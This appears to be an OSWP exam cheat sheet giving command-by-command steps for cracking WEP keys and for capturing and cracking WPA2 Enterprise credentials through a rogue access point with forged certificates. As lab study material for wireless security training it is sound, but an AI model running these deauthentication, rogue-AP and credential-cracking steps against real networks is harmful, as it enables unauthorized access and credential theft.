# Attacking WEP

Prepare the monitoring interface:
airmon-ng check kill
airmon-ng start wlan0

Setup a listener to catch traffic:
airodump-ng --bssid <BSSID> -c <CHANNEL> -w <OUTFILE> wlan0mon

Deauthenticate to generate some data and reveal clients:
aireplay-ng -0 0 -a <BSSID> wlan0mon

Fake authentication to generate IVs:
aireplay-ng -1 6 -e <SSID> -a <BSSID> -h <CLIENT MAC> wlan0mon

Use ARP Replay to catch and replay ARP packets, which will generate more data / IVs:
aireplay-ng -3 -b <BSSID> -h <CLIENT MAC> wlan0mon


Start running aircrack on the PCAP file to crack it:
aircrack-ng <capture file>

Connect to the network -> defer to https://github.com/CommodoreAlex/OSWP/blob/main/Connecting%20to%20APs

# Attacking WPA2 Enterprise

Look for WPA MGT network in airodump:
airodump-ng wlan0mon

Grab cert files from wireshark traffic using `tls.handshake.type == 11,3` or `tls.handshake.certificate` filters:
* View packet details -> TLSv1 Record Layer: Handshake Protocol: Certificate
* Save certificates to file, right click cert string and click export packet bytes.

View SSL cert info:
openssl x509 -inform der -in CERTIFICATE_FILENAME -text

Use freeradius to provide fake cert to clients:
* Alter certificate authority block in /etc/freeradius/3.0/certs/ca.cnf:
    [certificate_authority]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Such and Such Certificate Authority"
	
Alter server block in /etc/freeradius/3.0/certs/server.cnf:
    [server]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Such and Such Certificate Authority"
	
Change directory to /etc/freeradius/3.0/certs/ and run:
rm dh && make

An error will appear, disregard the error.

Setup hostapd-mana for the rogue AP using the mana.conf file, move to /etc/hostapd-mana/mana.conf

Use mana.eap_user file, move to /etc/hostapd-mana/mana.eap_user

Start hostapd-mana:

hostapd-mana /etc/hostapd-mana/mana.conf
Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:

<asleap command> -W /usr/share/john/password.lst

Create wpa_supplicant.conf file:

network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
Connect to network:

wpa_supplicant -c <config file>

Don't forget the grab and submit the proof.
